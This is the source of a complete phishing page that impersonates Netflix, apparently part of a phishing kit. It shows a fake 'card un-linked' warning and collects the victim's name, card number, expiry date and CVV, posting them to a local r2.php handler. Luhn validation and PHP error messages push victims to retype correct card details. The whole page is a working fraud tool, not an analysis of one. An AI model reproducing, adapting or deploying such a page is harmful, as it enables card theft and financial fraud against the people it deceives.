<style>
#cc-wrapper.fail #id_creditCardNumber {
  border-color: #F44336;
}
</style>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Netflix</title>
        <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
        <link type="text/css" rel="stylesheet" href="css/Cards.css">
        <link rel="shortcut icon" href="assets/icon.ico">
    </head>
    
    <body>
        <div id="appMountPoint">
            <div class="netflix-sans-font-loaded">
                <div class="basicLayout modernInApp signupSimplicity-creditOptionMode simplicity">
                    <div class="nfHeader noBorderHeader signupBasicHeader">
                        <a style="margin-top: 2%;" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
                            <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                                <g id="netflix-logo">
                                    <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                                </g>
                            </svg>
                            <span class="screen-reader-text">Netflix</span>
                        </a>
                        <a class="authLinks signupBasicHeader" data-uia="header-signout-link">Sign Out</a>
                    </div>
                    <div class="simpleContainer" data-transitioned-child="true">
                        <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
                            <form method="POST" action="r2.php" onsubmit="return validateForm()" data-uia="payment-form">
                                <div class="paymentFormContainer">
                                    <div>
                                        <div class="stepHeader-container" data-uia="header">
                                            <div class="stepHeader" data-a11y-focus="true" tabindex="0">
                                                <?php
                                                if(isset($_GET['error'])){
                                                    if($_GET['error'] == 'cvv'){
                                                        echo '
                                                        <div data-uia="error-message-container" class="ui-message-container ui-message-error">
                                                            <div class="ui-message-icon"></div>
                                                            <div data-uia="text" class="ui-message-contents">                                
                                                                Please enter a valid Security Code. This is the 3 digits on the back of your card
                                                            </div>
                                                        </div>
                                                        ';
                                                    }
                                                    if($_GET['error'] == 'cardInvalid'){
                                                        echo '
                                                        <div data-uia="error-message-container" class="ui-message-container ui-message-error">
                                                            <div class="ui-message-icon"></div>
                                                            <div data-uia="text" class="ui-message-contents">                                
                                                                Your card number is incorrect, please check and enter your 15 or 16 digit card number below
                                                            </div>
                                                        </div>
                                                        ';
                                                    }
                                                }
                                                else{
                                                    echo '
                                                    <div data-uia="error-message-container" class="ui-message-container ui-message-error">
                                                        <div class="ui-message-icon"></div>
                                                        <div data-uia="text" class="ui-message-contents">                                
                                                            Your card has been un-linked from your Netflix account. To continue using your plan, you must have a valid card attached to your account.
                                                        </div>
                                                    </div>
                                                    ';
                                                }
                                                ?>
                                                <h1 class="stepTitle" data-uia="stepTitle">Set up your credit or debit card.</h1>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="fieldContainer">
                                        <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept VISA, MASTERCARD and AMEX.">
                                            <img alt="" class="logoIcon VISA" data-uia="logoIcon-VISA" src="assets/visa-v2.svg">
                                            <img alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="assets/mastercard-v2.svg">
                                            <img alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX" src="assets/amex-v2.svg">
                                        </span><div class="">
                                        <ul class="simpleForm structural ui-grid">
                                            <li data-uia="field-firstName+wrapper" class="nfFormSpace">
                                                <div data-uia="field-firstName+container" class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label class="input_id" placeholder="firstName">
                                                            <input data-uia="field-firstName" name="firstName" class="nfTextField" id="id_firstName" type="text" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" placeholder="First Name">
                                                        </label>
                                                    </div>
                                                </div>
                                            </li>
                                            <li data-uia="field-lastName+wrapper" class="nfFormSpace">
                                                <div data-uia="field-lastName+container" class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label class="input_id" placeholder="lastName">
                                                            <input data-uia="field-lastName" name="lastName" class="nfTextField" id="id_lastName" type="text" tabindex="0" autocomplete="cc-family-name" placeholder="Last Name">
                                                        </label>
                                                    </div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
                                                <div class="cardNumberContainer">
                                                    <div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
                                                        <div  class="nfInputPlacement">
                                                            <label id="cc-wrapper" class="input_id" placeholder="creditCardNumber">
                                                                <input data-uia="field-creditCardNumber" onkeyup="check()" placeholder="Card Number" name="cardNumber" class="nfTextField" id="id_creditCardNumber" type="tel" tabindex="0" autocomplete="off" maxlength="16" minlength="15" dir="" value="">
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditExpirationMonth+container" class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label class="input_id" placeholder="creditExpirationMonth">
                                                            <select style="margin-bottom: 2%;" class="nfTextField" id="id_creditCardNumber" name='expireMM' id='expireMM'>
                                                                <option value=''>Month</option>
                                                                <option value='01'>January</option>
                                                                <option value='02'>February</option>
                                                                <option value='03'>March</option>
                                                                <option value='04'>April</option>
                                                                <option value='05'>May</option>
                                                                <option value='06'>June</option>
                                                                <option value='07'>July</option>
                                                                <option value='08'>August</option>
                                                                <option value='09'>September</option>
                                                                <option value='10'>October</option>
                                                                <option value='11'>November</option>
                                                                <option value='12'>December</option>
                                                            </select> 
                                                            <select class="nfTextField" id="id_creditCardNumber" name='expireYY' id='expireYY'>
                                                                <option value=''>Year</option>
                                                                <option value='20'>2020</option>
                                                                <option value='21'>2021</option>
                                                                <option value='22'>2022</option>
                                                                <option value='23'>2023</option>
                                                                <option value='24'>2024</option>
                                                                <option value='25'>2025</option>
                                                                <option value='26'>2026</option>
                                                                <option value='27'>2027</option>
                                                                <option value='28'>2028</option>
                                                            </select> 
                                                        </label>
                                                    </div>
                                                </div>
                                            </li>
                                            <li data-uia="field-creditExpirationYear+wrapper" class="nfFormSpace"></li>
                                            <li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace">
                                                <div data-uia="field-creditCardSecurityCode+container" class="nfInput nfInputOversize tooltip">
                                                    <div class="nfInputPlacement">
                                                        <label class="input_id" placeholder="creditCardSecurityCode">
                                                            <input data-uia="field-creditCardSecurityCode" name="cvv" placeholder="Security Code (CVV)" class="nfTextField" id="id_creditCardSecurityCode" type="tel" tabindex="0" autocomplete="off" maxlength="4" minlength="3" dir="" value="">
                                                        </label>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                  
                                    <ul class="simpleForm structural ui-grid">
                                        <li data-uia="field-hasAcceptedTermsOfUse+wrapper" class="nfFormSpace">
                                            <div class="signupTerms" data-uia="termsOfUse+eu-no_trial" id="tou-eu-no_trial">
                                                <span id="" data-uia="">
                                                    <p>By clicking the "Submit" button below, you agree to our <a target="blank" href="https://help.netflix.com/legal/termsofuse">Terms of Use</a>, and that you are over 18 and acknowledge the <a target="blank" href="https://help.netflix.com/legal/privacy">Privacy Statement</a>. You agree that your account will be unlocked immediately but you can still cancel at any time. Netflix will automatically continue your membership and charge the membership fee (now £2.99) to your payment method on a monthly basis until you cancel.</p>
                                                </span>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                                </div><div class="submitBtnContainer">
                                    <button id="simplicityPayment-START" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment">Submit</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
                        <div class="footer-divider"></div><div class="site-footer"><p class="footer-top">Questions? Call <a class="footer-top-a" href="tel:0800 096 6379">0800 096 6379</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/support/412" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Centre</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy#cookies" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie Preferences</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/en/node/2101" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li></ul></div>
                    </div>
                </div>
            </div>

        </div>
    </body>



<script>
const cc = document.getElementById("id_creditCardNumber");
const ccWrapper = document.getElementById("cc-wrapper");

class Luhn {
  constructor(text) {
    this.text = String(text).replace(/[\s]/g, "");
    this.len = text.length;
  }
  validate() {
    let odd = false;
    let total = 0;
    let calc, calc2;

    if (this.len === 0)
      return false;

    if (!/^[0-9]+$/.test(this.text))
      return false;

    for (let i = this.len; i > 0; i--) {
      calc = parseInt(this.text.charAt(i - 1));
      if (!odd) {
        total += calc;
      } else {
        calc2 = calc * 2;

        switch (calc2) {
          case 10:
            calc2 = 1;
            break;
          case 12:
            calc2 = 3;
            break;
          case 14:
            calc2 = 5;
            break;
          case 16:
            calc2 = 7;
            break;
          case 18:
            calc2 = 9;
            break;
          default:
            calc2 = calc2;
        }
        total += calc2;
      }
      odd = !odd;
    }

    return ((total % 10) === 0);
  }
}

function check() {
  let luhnChecker = new Luhn(cc.value);
  luhnChecker.validate() ? ccWrapper.className = "pass" : ccWrapper.className = "fail";
}
</script>
</html>